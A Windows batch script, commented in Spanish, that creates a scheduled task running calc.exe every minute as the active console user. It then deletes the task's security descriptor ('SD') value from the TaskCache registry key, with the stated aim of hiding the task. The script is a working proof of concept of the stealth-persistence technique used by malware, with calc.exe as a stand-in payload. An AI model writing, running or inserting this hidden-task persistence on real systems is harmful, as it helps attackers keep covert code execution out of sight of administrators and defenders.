@echo off
setlocal enabledelayedexpansion

set "taskName=Calc_PS7"
set "action=calc.exe"
set "trigger=minute"
set "time=1"

:: Obtener el nombre del usuario activo en la consola
for /f "tokens=1" %%a in ('query user ^| findstr /i "console"') do set USERNAME=%%a

:: Verificar que se haya capturado el nombre del usuario
if not defined USERNAME (
    echo No se pudo obtener el nombre del usuario activo.
    exit /b
)

:: Mostrar el nombre del usuario (opcional para verificar)
echo El usuario activo es: !USERNAME!

:: Crear la tarea programada
schtasks /create /tn "%taskName%" /tr "%action%" /sc %trigger% /mo %time% /ru "!USERNAME!" /f

@echo off
echo:
if %errorlevel% neq 0 echo El programa se debe ejecutar con privilegios de administrador.
echo:
echo Presiona cualquier tecla para continuar con la ejecucion del programa...
echo:
if %errorlevel% equ 0 echo Se crea la tarea programada. Presiona cualquier tecla para continuar con la ejecucion de este programa...
pause >nul


:: Eliminar el valor SD para ocultar la tarea
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\%taskName%" /v "SD" /f


@echo off
echo:
if %errorlevel% neq 0 echo El programa se debe ejecutar con privilegios de administrador
echo:
echo Presiona cualquier tecla para cerrar esta ventana...
echo:
if %errorlevel% equ 0 echo Se elimina el valor SD de la tarea  programada Presiona cualquier tecla para cerrar esta ventana...
pause >null
